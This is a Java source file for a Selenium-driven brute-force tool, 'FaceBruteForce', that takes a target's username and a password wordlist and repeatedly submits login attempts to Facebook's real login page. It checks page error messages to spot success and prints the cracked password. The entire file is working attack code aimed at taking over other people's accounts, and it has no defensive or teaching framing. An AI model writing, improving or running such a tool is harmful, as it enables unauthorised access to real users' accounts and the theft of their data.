package com.mejidprojects.facebruteforce;

import org.openqa.selenium.By;
import org.openqa.selenium.TimeoutException;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.Duration;

public class FaceBruteForce {
    private final String URL = "https://web.facebook.com/login/?_rdc=1&_rdr", chromeDriverPath,
            EMAIL_SELECTOR = "#email", PASS_SELECTOR = "#pass", LOGIN_SELECTOR = "#loginbutton",
            PASS_INCORRECT = "#loginform > div:nth-child(12) > div._9ay7", ERROR_BOX = "#error_box",
            INVALID_USERNAME = "#error_box > div:nth-child(2)", username;
    private File wordList;
    private BufferedReader reader;
    private WebDriver driver;
    private boolean isConnected = false;

    public FaceBruteForce (String username, String wordlistPath, String chromeDriverPath) {
        // check the username
        this.username = username;
        this.chromeDriverPath = chromeDriverPath;
        if (username.isEmpty()) {
            System.out.println("[!] Please enter a correct username, email or phone number of the target.");
            return;
        }
        // check the wordlist path
        if (!isFileExists(wordlistPath)) return;
        else wordList = new File(wordlistPath);
        // init buffered reader to read the wordlist
        try {
            reader = new BufferedReader(new FileReader(wordList));
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        // check the network connection
        if (websiteConnected()) {
            System.setProperty("webdriver.chrome.driver", chromeDriverPath);
            driver = new ChromeDriver();
            System.out.println("[+] Website url is working.");
            isConnected = true;
        }
    }

    public void startAttack() {
        if (!isConnected) {
            System.out.println("[*] Please connect your machine with a network.");
            return;
        }
        // get the website
        driver.get(URL);
        WebDriverWait wait = new WebDriverWait(driver, Duration.ofSeconds(10));
        try {
            String password = reader.readLine();
            while (password != null) {
                // initialise email & password inputs
                WebElement emailInput = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(EMAIL_SELECTOR)));
                WebElement passInput = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(PASS_SELECTOR)));
                // clear the inputs
                emailInput.clear();
                passInput.clear();
                Thread.sleep(500);
                // fill in the info into the email & password inputs
                emailInput.sendKeys(username);
                passInput.sendKeys(password);
                // wait login button to be clickable
                wait.until(ExpectedConditions.elementToBeClickable(By.cssSelector(LOGIN_SELECTOR))).click();
                // wait until the password will have checked
                Thread.sleep(1000);
                // check the error box if the password value is incorrect
                try {
                    WebElement passBox = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(PASS_INCORRECT)));
                    if (passBox.getText().contains("The password that you've entered is incorrect.")) {
                        System.out.println("[-] The password (" + password + ") unfortunately incorrect.");
                    }
                    else {
                        if (!driver.getCurrentUrl().equals(URL)) {
                            System.out.println("[+] Successfully logged In The password (" + password + ").");
                            break;
                        }
                    }
                }
                catch (TimeoutException e) {
                    // nothing to do right now
                }
                // check if an error occurred
                try {
                    WebElement errorBox = wait.until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(ERROR_BOX)));
                    WebElement invalidUsername = new WebDriverWait(
                            driver, Duration.ofSeconds(1)).until(ExpectedConditions.presenceOfElementLocated(By.cssSelector(INVALID_USERNAME))
                    );
                    if (errorBox != null) {
                        if (invalidUsername.isDisplayed() && invalidUsername.getText().contains("Invalid username or password")) {
                            System.out.println("[*] You have been reached the limit of tries, Please try again later after hours.");
                        }
                        else System.out.println("[!] Error occurred : " + errorBox.getText());
                        break;
                    }
                }
                catch (Exception e) {
                    // nothing to do
                }

                // read the next password
                password = reader.readLine();
            }
            System.out.println("[*] Finished.");
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    private boolean isFileExists(String path) {
        File file = new File(path);
        if (file.exists()) {
            if (file.isFile()) return true;
            else System.out.println("[!] Wordlist path is wrong, this is a Directory. Please try again.");
        }
        else System.out.println("[!] Please enter a correct wordlist path.");
        return false;
    }

    private boolean websiteConnected() {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(URL).openConnection();
            return connection.getResponseCode() == HttpURLConnection.HTTP_OK;
        }
        catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }
}
